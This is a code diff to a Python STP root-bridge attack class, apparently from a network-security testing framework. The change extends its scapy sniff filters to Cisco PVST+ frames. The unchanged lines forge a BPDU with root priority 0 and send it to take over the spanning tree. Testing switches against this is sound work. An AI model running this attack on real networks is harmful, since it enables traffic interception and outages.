@@ -9,7 +9,7 @@ class STProot(Attack):
 
     def setup(self):
         with netns.NetNS(nsname=self.attack_ns):
-            packet = scapy.sniff(filter="ether dst 01:80:c2:00:00:00", iface=self.attack_if, count=1, timeout=10)
+            packet = scapy.sniff(filter="ether dst 01:80:c2:00:00:00 or ether dst 01:00:0c:cc:cc:cd", iface=self.attack_if, count=1, timeout=10)
             if len(packet) == 0:
                 raise RuntimeError("No STP packets on Link.")
             else:
@@ -18,7 +18,7 @@ class STProot(Attack):
 
     def attack(self) -> scapy.Packet:
         with netns.NetNS(nsname=self.attack_ns):
-            packet = scapy.sniff(filter="ether dst 01:80:c2:00:00:00", iface=self.attack_if, count=1, timeout=10)
+            packet = scapy.sniff(filter="ether dst 01:80:c2:00:00:00 or ether dst 01:00:0c:cc:cc:cd", iface=self.attack_if, count=1, timeout=10)
             packet[0].src='00:00:00:00:00:01'
             packet[0].rootid=0
             packet[0].rootmac='00:00:00:00:00:01'
@@ -26,7 +26,7 @@ class STProot(Attack):
             packet[0].bridgemac='00:00:00:00:00:01'
 
             scapy.sendp(packet[0], iface=self.attack_if)
-            ans = scapy.sniff(filter="ether dst 01:80:c2:00:00:00", iface=self.attack_if, count=1, timeout=30)
+            ans = scapy.sniff(filter="ether dst 01:80:c2:00:00:00 or ether dst 01:00:0c:cc:cc:cd", iface=self.attack_if, count=1, timeout=30)
             return ans[0]
 
     def evaluate(self, ans:scapy.Packet) -> bool:
